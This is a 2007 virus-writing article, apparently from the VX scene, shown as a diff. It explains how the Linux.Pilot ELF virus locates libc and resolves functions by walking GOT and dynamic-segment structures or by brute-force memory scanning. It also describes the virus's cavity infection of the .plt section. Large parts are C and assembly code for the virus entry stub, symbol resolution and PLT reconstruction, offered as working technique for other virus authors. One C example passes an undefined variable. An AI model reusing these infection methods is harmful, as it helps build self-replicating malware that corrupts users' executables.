@@ -1,0 +1,455 @@
+                           INT 0x80? No, thank you!
+
+   herm1t, 2007-21-11
+
+Introduction
+
+   After finishing the Lacrimae virus which is able to extend any section
+   and  thus  import library functions, I spent some time thinking how an
+   ordinary  virus can use the libc or any other library. There are a lot
+   of opportunities for the viruses having such a feature. Here I wish to
+   present a method to do it, using test virus Linux.Pilot as an example.
+
+   As  late  as  in  2002  the grugq published a nice method of resolving
+   symbols  at  run-time utilizing the pointer to the link_map structure,
+   saved  within  program's GOT by dynamic linker [1]. As another BugTraq
+   writer stated - this was known even earlier, but to my great surprise,
+   I  didn't  saw any virus using this technique. My results were similar
+   to  the  ones obtained by grugq, though I decided do not use link_map.
+   There is a another method, more simple and independent of how lazy the
+   dynamic linker is.
+
+Obtaining libc address
+
+   We  will  make advantage of the fact that the dynamic linker and (most
+   likely) the program are using libc. To obtain the base address of libc
+   and,  hence,  the  access  to  its functions and symbol table (to find
+   function  addresses)  we will subsequently examine the contents of the
+   global  offset  table in current process, dynamic linker and libc. The
+   memory  after  loading the executable (and all its libraries) may look
+   as follows:
+      Lazy linking                             "Immediate" linking
+      /lib/tls/libc.so.6
+      .text                                    .text
+      malloc: <------+                         
+                     |                         libcfoo: <-----+
+      /lib/ld-linux.so.2                                      |
+      .text          |                         .text          |
+      _dl_runtime_resolve: <--+                               |
+                     |        |                               |
+      .got.plt       |        |                .got.plt       |
+GOT[0]|          |   |        |                |          |   |
+GOT[1]|          |   |        |                |          |   |
+GOT[2]|          |   |        |                |          |   |
+GOT[3]| memalign |   |        |                | memalign |   |
+GOT[4]| malloc   | --+        |                | malloc   |   |
+                              |                               |
+      Program                 |                               |
+      .plt push  GOT[1]       |                .plt           |
+           jmp   GOT[2]       |                               |
+      .plt+16                 |                .plt+16        |
+      libcfoo@plt:            |                               |
+           jmp   GOT[3]       |                    jmp GOT[3] |
+           push  0 <----+     |                               |
+           jmp   .plt   |     |                               |
+      .got.plt          |     |                .got.plt       |
+GOT[0]| .dynamic |      |     |                | .dynamic |   |
+GOT[1]| link_map |      |     |                |          |   |
+GOT[2]| _resolve | -----|-----+                |       0  |   |
+GOT[3]| libcfoo  | -----+                      | libcfoo  | --+        
+
+   The actions for each step are much the same:
+     * Having arbitrary address within .text, find the base address
+          + Align address to the page boundary
+          + Do we have ELF header at this address?
+          + No? Substract page size from address and check again.
+void *get_base(uint32_t addr) {
+        addr &= ~4095;
+        while (*(uint32_t*)addr != 0x464c457fUL)
+                addr -= 4096;
+        return (void*)addr;
+}
+     * Find  dynamic  segment in PHT (entry with type PT_DYNAMIC) and the
+       delta between file's lowest address and actual memory location
+void get_dyn_file_base(uint8_t *elf, Elf32_Dyn **dynamic, uint32_t *delta)
+{
+        int i;
+        Elf32_Phdr *phdr;
+        uint32_t dyn, low = 0xffffffff;
+        phdr = (Elf32_Phdr*)(elf + ((Elf32_Ehdr*)elf)->e_phoff);
+        for (i = 0; i < ((Elf32_Ehdr*)elf)->e_phnum; i++) {
+                if (phdr[i].p_type == PT_LOAD && low > phdr[i].p_vaddr)
+                        low = phdr[i].p_vaddr;
+                if (phdr[i].p_type == PT_DYNAMIC)
+                        dyn = phdr[i].p_vaddr;
+        }
+        *delta = (uint32_t)elf - low;
+        *dynamic = (Elf32_Dyn*)(dyn + *delta);
+}
+     * Find GOT address in DYNAMIC (entry with type DT_PLTGOT)
+void *get_from_dyn(Elf32_Dyn *dynamic, uint32_t tag)
+{
+        Elf32_Dyn *dyn;
+        for (dyn = dynamic; dyn->d_tag != DT_NULL; ++dyn)
+                if (dyn->d_tag == tag)
+                        return (uint32_t*)dyn->d_un.d_ptr;
+        return NULL;
+}
+
+   This is exactly what unwind function is doing:
+void unwind(uint32_t addr, uint32_t **got, Elf32_Dyn **dyn, uint32_t *delta)
+{
+        get_dyn_file_base(get_base(addr), dyn, delta);
+        *got = get_from_dyn(*dyn, DT_PLTGOT);
+        printf("unwind: GOT=%08x DYNAMIC=%08x DELTA=%08x\n", *got, *dyn, *delta
+);
+}
+
+   To  start "unwinding" the loaded elves we need the address of GOT. You
+   can  either call unwind for some adress within the current process and
+   get  the  address  of GOT, or the address of GOT could be saved in the
+   subsequent virus generation by the infection routine.
+
+   By  repeating  this sequence with GOT[2] as argument we will get base,
+   dynamic,  delta  and  got of the dynamic linker. Since it is using the
+   libc itself, let's do it one more time for linker's GOT[4] and we will
+   find  those addresses of libc. Now, one could use the hash and dynamic
+   symbol  table  to  resolve  the addresses of functions. I'm using here
+   GOT[4], not GOT[3], because in older version of libc it was reserved.
+
+   If  the  executable  was  started with LD_BIND_NOW (all addresses were
+   resolved  before  starting  the program), run the unwind function once
+   for  any  libc'  GOT  entry  in  the  current process. For the sake of
+   simplicity  Linux.Pilot doesn't check if the GOT entry really intended
+   to  be  filled  with  address of libc function, while one may find the
+   __libc_start_main's GOT entry (just to be sure).
+
+   Consider the following example:
+int main(int argc, char **argv, char **envp)
+{
+        uint32_t *got, delta;
+        Elf32_Dyn *dyn;
+        unwind((uint32_t)main, &got, &dyn, & delta);
+        if (got[2])
+                unwind(got[2], &got, &dyn, & delta);
+        unwind(got[4], &got, &dyn, d);
+
+        Elf32_Sym *dynsym;
+        char *dynstr;
+        uint32_t *hash;
+        void (*printf_ptr)(char*,...);
+
+        dynsym = (Elf32_Sym*)get_from_dyn(dyn, DT_SYMTAB);
+        dynstr = get_from_dyn(dyn, DT_STRTAB);
+        hash = get_from_dyn(dyn, DT_HASH);
+        printf_ptr = (void(*)(char*,...))(lookup("printf", hash, dynsym, dynstr
+) + delta);
+        printf_ptr("Hello, world! printf = %08x\n", (uint32_t)printf_ptr);
+}
+
+   The  lookup returns the st_value field from the matched dynamic symbol
+   table entry. [2]
+
+   The output of the sample program on the prelinked system may look like
+   this:
+$ ./a.out 
+unwind: GOT=08049914 DYNAMIC=08049848 DELTA=00000000
+unwind: GOT=0052afb4 DYNAMIC=0052aef4 DELTA=00000000
+unwind: GOT=0021fff4 DYNAMIC=0021fd1c DELTA=00000000
+Hello, world! printf = 00142810
+$ export LD_BIND_NOW=1 && ./a.out 
+unwind: GOT=08049914 DYNAMIC=08049848 DELTA=00000000
+unwind: GOT=0021fff4 DYNAMIC=0021fd1c DELTA=00000000
+Hello, world! printf = 00142810
+
+   That's  how  we  can  obtain  the  addresses  of functions within libc
+   without single syscall.
+
+   The above functions in assembler:
+unwind:         push    eax
+                call    get_base
+                xchg    eax, edi
+                push    edi
+                call    get_dyn_file_base
+;               or      eax, eax
+;               jz      fail
+                xchg    eax, esi
+                sub     edi, edx
+                add     esi, edi
+                push    DT_PLTGOT
+                push    esi
+                call    get_from_dyn
+;               or      eax, eax
+;               jz      fail
+                xchg    eax, ecx
+                ret
+
+; get_base(addr) - return base address of the loaded ELF file
+get_base:       mov     eax, [esp + 4]
+                and     ax, 0xf000
+        .loop:  cmp     dword [eax + 0], 0x464c457f
+                jne     .next
+;               cmp     dword [eax + 4], 0x00010101
+;               jne     .next
+                retn    4
+        .next:  sub     eax, 4096
+                jmp     .loop
+; get_from_dyn(DYNAMIC, tag) - return the DYNAMIC entry with given tag
+get_from_dyn:   push    esi
+                cld
+                mov     esi, [esp + 8]
+        .loop:  lodsd
+                or      eax, eax
+                jz      .done
+                cmp     eax, [esp + 12]
+                je      .done
+                lodsd
+                jmp     .loop
+        .done:  lodsd
+                pop     esi
+                retn    8
+; uint64_t get_dyn_file_base(elf_file) return VA of DYNAMIC and lowest VA in EL
+F file
+get_dyn_file_base:
+                pusha
+                mov     esi, [esp + 36]
+                movzx   ecx, word [esi + e_phnum]
+                add     esi, [esi + e_phoff]
+                xor     eax, eax
+                cdq
+                dec     edx
+        .loop:  mov     ebx, [esi + p_type]
+                cmp     ebx, PT_LOAD
+                jne     .more
+                cmp     [esi + p_vaddr], edx
+                jae     .more
+                mov     edx, [esi + p_vaddr]
+        .more:  cmp     ebx, PT_DYNAMIC
+                jne     .next
+                mov     eax, [esi + p_vaddr]
+        .next:  add     esi, 32
+                loop    .loop
+                inc     edx
+                jz      .fail
+                dec     edx
+        .fail:  mov     [esp + 28], eax
+                mov     [esp + 20], edx
+                popa
+                retn    4
+
+   Since Linux.Pilot is a cavity infector which replaces the .plt section
+   with iself, it doesn't need the first call to unwind. It will grab the
+   GOT+8 address from the PLT directly:
+_plt:           push    dword [_GLOBAL_OFFSET_TABLE_ + 4]
+                jmp     dword [_GLOBAL_OFFSET_TABLE_ + 8]
+                dd      0
+; virus begins from the first PLT entry
+; calculate the address of virus and substract eight from it
+; to fetch the GOT+8 offset from the jmp instruction above
+main:           pusha
+                call    .l0
+.l0:            pop     ebp
+                sub     ebp, (.l0 - main)
+; instead of this
+                mov     ebx, [ebp - 8]                          ; GOT + 8
+; you may use unwind here:
+; mov   eax, ebp
+; call  unwind
+; lea   ebx, [ecx + 8]
+                mov     eax, [ebx]                              ; GOT[2] - _dl_
+runtime_resolve
+                or      eax, eax
+                jnz     .lazy
+                ; address is empty, LD_BIND_NOW is set?
+                ; use GOT[4], hope that this is libc...
+                ; this should be checked
+                mov     eax, [ebx + 8]                          
+                jmp     .bnow
+.lazy:          call    unwind
+                mov     eax, [ecx + 16]                         ; GOT[4] - addr
+ess of libc' function 
+.bnow:          call    unwind                                  ; within interp
+                ; now we have
+                ; esi           - libc' DYNAMIC
+                ; edi           - libc' delta
+                ; ecx           - libc' GOT
+                ...
+
+Brute force
+
+   The  address  of  the  loaded  ELF files could be found by brute force
+   search. We can install signal handler to catch the SIGSEGV (which will
+   raise on invalid memory references) and look through the whole address
+   space  of  the  process.  Since libc library is larger than 1Mb we can
+   increase  the  step of the search to fasten the search. The code below
+   will work both on 2.4 and 2.6:
+; compile with nasm -f elf search.asm -o search.o; gcc search.o -o search
+                BITS    32
+                CPU     386
+                global  main
+                extern  signal,printf
+                section .text
+main:           pusha
+;               push    segv
+;               push    11
+;               call    signal
+;               add     esp, 8
+                push    sret
+                push    0x4000000
+                push    0
+                push    segv
+                mov     eax, 67         ; sigaction
+                mov     ebx, 11
+                mov     ecx, esp
+                mov     edx, 0
+                int     0x80
+                add     esp, 16
+
+                xor     eax, eax
+        .next:  mov     edx, [eax]      ; BANG!
+                mov     ebx, eax
+                and     eax, 0xfffff000
+        .down:  cmp     dword [eax], 0x464c457f
+                je      .found
+                sub     eax, 0x1000
+                jmp     .down
+        .found: push    eax
+                push    format
+                call    printf
+                pop     eax
+                pop     eax
+                mov     eax, ebx
+        .up:    add     eax, 0x1000
+                mov     ecx, [eax]
+                jmp     .up
+        .done:  popa
+                ret
+segv:           mov     eax, [esp + 0x34]
+                add     dword [esp + 0x34], 1048576
+                cmp     [esp + 0x34], eax
+                jb      .done
+                mov     dword [esp + 0x40], main.next
+                ret
+        .done:  mov     dword [esp + 0x40], main.done
+                ret
+                db      0
+                align   8
+sret:           pop     eax
+                mov     eax, 119        ; sigreturn
+                int     0x80
+
+                section .data
+format          db      'Found ELF at %08x',10,0
+
+   The  only  thing  that  is  left (as an excercise to the reader) is to
+   check  whether  the found ELF is indeed the libc, one can do that, for
+   example,  by checking the DT_SONAME field in the dynamic segment or by
+   other means.
+
+Teaching old ELFs new tricks
+
+   And  a few words about PiLoT's infection routine. It is using the fact
+   that  you can replace any loadable section which does not take part in
+   the  process  of execution and linking of the file. The virus can move
+   (or  compress)  the  .text  section and restore it on exit. This virus
+   doing the same with Procedure Linkage Table (.plt section). Nice thing
+   about  PLT  is  that  you  don't  need to save its contents only a few
+   constants.
+
+   Let's  look  to  it closer (this is /bin/ps from my system, address of
+   GOT (Global Offset Table) is 080570e8):
+08048e58
+ 8048e58:  ,--->ff 35 ec 70 05 08       pushl  0x80570ec        ; GOT[1] addres
+s of link_map
+ 8048e5e:  |||  ff 25 f0 70 05 08       jmp    *0x80570f0       ; GOT[2] addres
+s of resolve
+           |||
+08048e68 <sigfillset@plt>:
+ 8048e68:  |||  ff 25 f4 70 05 08       jmp    *0x80570f4       ; GOT + 12
+ 8048e6e:  |||  68 00 00 00 00          push   $0x0             ; 0
+ 8048e73:  ||`--e9 e0 ff ff ff          jmp    8048e58
+           || 
+08048e78 <getgrnam@plt>:
+ 8048e78:  ||   ff 25 f8 70 05 08       jmp    *0x80570f8       ; GOT + 16
+ 8048e7e:  ||   68 08 00 00 00          push   $0x8             ; 8
+ 8048e83:  |`---e9 d0 ff ff ff          jmp    8048e58
+           |     
+08048e88 <readproctab2@plt>:
+ 8048e88:  |    ff 25 fc 70 05 08       jmp    *0x80570fc       ; GOT + 20
+ 8048e8e:  |    68 10 00 00 00          push   $0x10            ; 16
+ 8048e93:  `----e9 c0 ff ff ff          jmp    8048e58
+ ...
+
+   Note,  that addresses of the GOT entries (jmp *0x?) and offsets in the
+   relocation  table  (push $0x0) are sorted, and the jump and the end of
+   each  function  helper is pointing to the beginning of PLT, so you can
+   build  PLT table for the given executable from scratch having only the
+   address  of GOT. To be sure, PiLoT memorizes values of GOT pointer and
+   offset  in  relocation  table,  the number of entries in the table and
+   checks  that  these  values  are  increasing with the given step. This
+   check could be implemented as follows:
+        uint32_t gotp, orel;
+        gotp = orel = 0;
+        for (i = 16; i < psz; i += 16) {
+                if (gotp != 0) {
+                        if (*(uint32_t*)(plt + i + 2) - gotp != 4)
+                                goto failed;
+                        if (*(uint32_t*)(plt + i + 7) - orel != 8)
+                                goto failed;
+                }
+                gotp = *(uint32_t*)(plt + i + 2);
+                orel = *(uint32_t*)(plt + i + 7);               
+        }
+
+   Where plt is the pointer to the .plt section and psz its size.
+
+   The  virus  must  restore  the  PLT  before the main program starts to
+   invoke  library  functions  and since the program itself is started by
+   __libc_start_main()  this  method is incompatible with EPO. To restore
+   the  PLT  virus  should  allocate  memory  for  itself, jump there and
+   reconstruct the table:
+                ; restore .plt
+                mov     eax, ebp                ; ebp is .plt + 16
+                and     ax, 0xf000
+                push    PROT_READ|PROT_WRITE
+                push    4096
+                push    eax
+                call    mprotect
+                mov     edx, dword 0x08049000   ; first pointer to GOT
+first_got       equ     $-4-main
+                mov     esi, dword 0x00000000   ; first offset in .rel.plt
+first_rel       equ     $-4-main
+                mov     eax, dword 0xffffffe0   ; jump
+                mov     edi, ebp
+                mov     ecx, dword 1
+plt_count       equ     $-4-main
+        .fix:   push    eax
+                mov     ax, 0x25ff
+                stosw
+                mov     eax, edx
+                stosd
+                mov     al, 0x68
+                stosb
+                mov     eax, esi
+                stosd
+                mov     al, 0xe9
+                stosb
+                pop     eax
+                stosd
+                sub     eax, 16
+                add     esi, 8
+                add     edx, 4
+                loop    .fix
+                mov     byte [esp + 8], PROT_READ|PROT_EXEC
+                call    mprotect
+                add     esp, 12
+
+   Comments are welcome. <[1]herm1t@vx.netlux.org>
+
+References
+
+    1. the     grugq     "More     ELF     buggery...",     May,    2002,
+       http://seclists.org/bugtraq/2002/May/0249.html
+    2. herm1t "Hashing the elves", Oct 2007
+
+
